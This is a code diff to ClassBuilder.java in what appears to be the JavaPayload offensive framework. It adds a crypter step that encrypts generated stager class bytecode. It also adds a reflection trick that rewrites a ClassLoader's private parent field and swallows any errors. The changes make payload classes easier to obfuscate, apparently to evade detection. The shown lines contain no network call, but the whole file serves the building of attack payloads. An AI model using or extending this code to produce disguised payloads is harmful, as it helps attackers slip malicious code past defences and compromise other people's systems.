@@ -39,7 +39,10 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.io.UnsupportedEncodingException;
+import java.lang.reflect.Field;
 
+import javapayload.Module;
+import javapayload.crypter.Crypter;
 import javapayload.loader.DynLoader;
 import javapayload.stager.Stager;
 
@@ -54,15 +57,26 @@ import org.objectweb.asm.Opcodes;
 
 public class ClassBuilder extends Builder {
 
-	protected static void buildClass(final String classname, final String stager, Class loaderClass, final String embeddedArgs, String[] realArgs) throws Exception {
+	protected static void buildClass(String classname, final String stager, Class loaderClass, final String embeddedArgs, String[] realArgs) throws Exception {
 		final byte[] newBytecode = buildClassBytes(classname, stager, loaderClass, embeddedArgs, realArgs);
+		if (classname.indexOf('^') != -1)
+			classname = classname.substring(0, classname.indexOf('^'));
 		final FileOutputStream fos = new FileOutputStream(classname + ".class");
 		fos.write(newBytecode);
 		fos.close();		
 	}
 	
-	public static byte[] buildClassBytes(final String classname, final String stager, Class loaderClass, final String embeddedArgs, String[] realArgs) throws Exception {
-		
+	public static byte[] buildClassBytes(String classnameAndCrypter, final String stager, Class loaderClass, final String embeddedArgs, String[] realArgs) throws Exception {
+		final String crypter, classname, finalClassname;
+		int pos = classnameAndCrypter.indexOf('^'); 
+		if (pos != -1) {
+			finalClassname = classnameAndCrypter.substring(0, pos);
+			crypter = classnameAndCrypter.substring(pos+1);
+		} else {
+			finalClassname = classnameAndCrypter;
+			crypter = System.getProperty(CrypterBuilder.CRYPTER_PROPERTY);
+		}
+		classname = finalClassname + (crypter != null && crypter.length() > 0 ? "$" : "");
 		final ClassWriter writerThreadCW = new ClassWriter(0);
 
 		final ClassVisitor writerThreadVisitor = new ClassAdapter(writerThreadCW) {
@@ -225,7 +239,12 @@ public class ClassBuilder extends Builder {
 			}
 		};
 		visitClass(loaderClass, loaderVisitor, cw);
-		return cw.toByteArray();
+		byte[] result = cw.toByteArray();
+		if (crypter != null && crypter.length() > 0) {
+			Crypter c = (Crypter) Module.load(Crypter.class, crypter);
+			result = c.crypt(finalClassname, result);
+		}
+		return result;
 	}
 
 	public static void main(String[] args) throws Exception {
@@ -241,7 +260,7 @@ public class ClassBuilder extends Builder {
 	}
 	
 	public String getParameterSyntax() {
-		return "<stager> [classname]";
+		return "<stager> [<classname>[^<crypter>]]";
 	}
 	
 	public void build(String[] args) throws Exception {
@@ -275,6 +294,11 @@ public class ClassBuilder extends Builder {
 		
 		public static void mainToEmbed(String[] args) throws Exception {
 			ClassBuilderTemplate cb = new ClassBuilderTemplate();
+			try {
+				Field f = Class.forName("java.lang.ClassLoader").getDeclaredField("parent");
+				f.setAccessible(true);
+				f.set(cb, cb.getClass().getClassLoader());
+			} catch (Throwable t) {}
 			boolean needWait = false;
 			if (args[0].startsWith("+")) {
 				args[0] = args[0].substring(1);
